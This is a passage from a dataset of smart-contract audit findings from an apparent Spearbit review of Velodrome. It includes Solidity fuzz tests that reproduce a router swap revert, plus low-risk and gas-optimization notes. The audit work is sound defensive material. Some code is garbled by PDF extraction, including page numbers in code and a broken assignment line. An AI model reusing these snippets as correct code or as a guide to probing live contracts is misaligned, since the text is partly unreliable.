1e18)) / 1e18 + (((((x0 * x0) / 1e18) * x0) / 1e18) * y) / ,! 1e18; } //Pair.sol#L450-L476 function _get_y( uint256 x0, uint256 xy, uint256 y ) internal pure returns (uint256) { for (uint256 i = 0; i < 255; i++) { uint256 y_prev = y; uint256 k = _f(x0, y); if (k < xy) { uint256 dy = ((xy - k) * 1e18) / _d(x0, y); y = y + dy; } else { uint256 dy = ((k - xy) * 1e18) / _d(x0, y); y = y - dy; } if (y > y_prev) { if (y - y_prev <= 1) { return y; } } else { if (y_prev - y <= 1) { return y; } } } return y; } The getAmountOut is not always correct. This results in the router unexpectedly revert a regular and correct transaction. We can find one parameter that the router will fail to swap within 5s fuzzing. 36 function testAmountOut(uint swapAmount) public { vm.assume(swapAmount < 1_000_000_000 ether); vm.assume(swapAmount > 1_000_000); uint256 reserve0 = 100 ether; uint256 reserve1 = 100 ether; uint amountIn = swapAmount - swapAmount * 2 / 10000; uint256 amountOut = _getAmountOut(amountIn, token0, reserve0, reserve1); uint initialK = _k(reserve0, reserve1); reserve0 += amountIn; reserve1 -= amountOut; console.log(\"initial k:\", initialK); console.log(\"curent k:\", _k(reserve0, reserve1)); console.log(\"curent smaller k:\", _k(reserve0, reserve1 - 1)); require(initialK < _k(reserve0, reserve1), \"K\"); require(initialK > _k(reserve0, reserve1-1), \"K\"); } After the fuzzer have a counter example of swapAmount = 1413611527073436 We can test that the Router will revert if given the fuzzed params. contract PairTest is BaseTest { function testRouterSwapFail() public { Pair pair = Pair(factory.createPair(address(DAI), address(FRAX), true)); DAI.approve(address(router), 100 ether); FRAX.approve(address(router), 100 ether); _addLiquidityToPool( address(this), address(router), address(DAI), address(FRAX), true, 100 ether, 100 ether ); uint swapAmount = 1413611527073436; DAI.approve(address(router), swapAmount); // vm.expectRevert(); console.log(\"fee:\", factory.getFee(address(pair), true)); IRouter.Route[] memory routes = new IRouter.Route[](1); routes[0] = IRouter.Route(address(DAI), address(FRAX), true, address(0)); uint daiAmount = DAI.balanceOf(address(pair)); uint FRAXAmount = FRAX.balanceOf(address(pair)); console.log(\"daiAmount: \", daiAmount, \"FRAXAmount: \", FRAXAmount); vm.expectRevert(\"Pair: K\"); router.swapExactTokensForTokens(swapAmount, 0, routes, address(owner), block.timestamp); } }", "labels": ["Spearbit", "Velodrome", "Severity: Low Risk"]}, {"title": "VotingEscrow checkpoints is not synchronized", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf", "body": "Delegating token ids is not synchronizing correctly fromBlock variable in the checkpoint, by leaving it not updated the functions getPastVotesIndex and _findWhatCheckpointToWrite could return the incorrect index.", "labels": ["Spearbit", "Velodrome", "Severity: Low Risk"]}, {"title": "Wrong proposal expected value in VeloGovernor", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf", "body": "The expected values of MAX_PROPOSAL_NUMERATOR and proposalNumerator are incorrect, in the current implementation max proposal is set to 0.5%, the expected value is 5%, and the proposal numerator starts at 0.02%, and not at 0.2% as expected.", "labels": ["Spearbit", "Velodrome", "Severity: Low Risk"]}, {"title": "_burn function will always revert if the caller is the approved spender", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf", "body": "The owner or the approved spender is allowed to trigger the _burn function. However, whenever an approved spender triggers this function, it will always revert. This is because the _removeTokenFrom function will revert internally if the caller is not the owner of the NFT as shown below. function _removeTokenFrom(address _from, uint256 _tokenId) internal { // Throws if `_from` is not the current owner assert(idToOwner[_tokenId] == _from); As a result, an approved spender will not be able to withdraw or merge a veNFT on behalf of the owner because the internal _burn function will always revert.", "labels": ["Spearbit", "Velodrome", "Severity: Low Risk"]}, {"title": "OpenZeppelin's Clones library can be used to cheaply deploy rewards contracts", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf", "body": "OpenZeppelin's Clones library allows for significant gas savings when there are multiple deploy- ments of the same family of contracts. This would prove useful in several factory contracts which commonly deploy the same type of contract. Minimal proxies make use of the same code even when initialization data may be different for each instance. By pointing to an implementation contract, we can delegate all calls to a fixed address and minimise deployment costs.", "labels": ["Spearbit", "Velodrome", "Severity: Gas Optimization"]}, {"title": "VelodromeTimeLibrary functions can be made unchecked", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf", "body": "Running the following fuzz test pragma solidity 0.8.13; import \"forge-std/Test.sol\"; contract VelodromeTimeLibrary { uint256 public constant WEEK = 7 days; /// @dev Returns start of epoch based on current timestamp function epochStart(uint256 timestamp) public pure returns (uint256) { unchecked { return timestamp - (timestamp % WEEK); } } /// @dev Returns unrestricted voting window function epochEnd(uint256 timestamp) public pure returns (uint256) { unchecked { 40 return timestamp - (timestamp % WEEK) + WEEK - 1 hours; } } } contract VelodromeTimeLibraryTest is Test { VelodromeTimeLibrary vtl; uint256 public constant WEEK = 7 days; function setUp() public { vtl = new VelodromeTimeLibrary(); } function testEpochStart(uint256 timestamp) public { uint256 uncheckedVal = uint256 normalVal = timestamp - (timestamp % WEEK); assertEq(uncheckedVal, normalVal); vtl.epochStart(timestamp); } function testEpochEnd(uint256 timestamp) public { uint256 uncheckedVal = vtl.epochEnd(timestamp); uint256 normalVal = timestamp - (timestamp % WEEK) + WEEK - 1 hours; assertEq(uncheckedVal, normalVal); } } One can see that both VelodromeTimeLibrary functions will only start to overflow at a ridiculously high timestamp input.", "labels": ["Spearbit", "Velodrome", "Severity: Gas Optimization"]}, {"title": "Skip call can save gas", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf", "body": "distribute(address[] memory _gauges) is meant to be used for multiple gauges but it calls minter.update_period before each call to notifyRewardAmount", "labels": ["Spearbit", "Velodrome", "Severity: Gas Optimization"]}, {"title": "Change to zero assignment to save gas", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf", "body": "It is not necessary to subtract the total value from the votes instead you should set it directly to zero.", "labels": ["Spearbit", "Velodrome", "Severity: Gas Optimization"]}, {"title": "Refactor to skip an SLOAD", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf", "body": "It is possible to skip an SLOAD by refactoring the code as it is in recommendation.", "labels": ["Spearbit", "Velodrome", "Severity: Gas Optimization"]}, {"title": "Tail variable can be removed to save gas", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf", "body": "It is possible to save gas by freeing the tail slot, which can be replaced by check weekly < TAIL_- START", "labels": ["Spearbit", "Velodrome", "Severity: Gas Optimization"]}, {"title": "Use a bitmap to store nudge proposals for each epoch", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf", "body": "The usage of a bitmap implementation for boolean values can save a significant amount of gas. The proposals variable can be indexed by each epoch which should only increment once per week.", "labels": ["Spearbit", "Velodrome", "Severity: Gas Optimization"]}]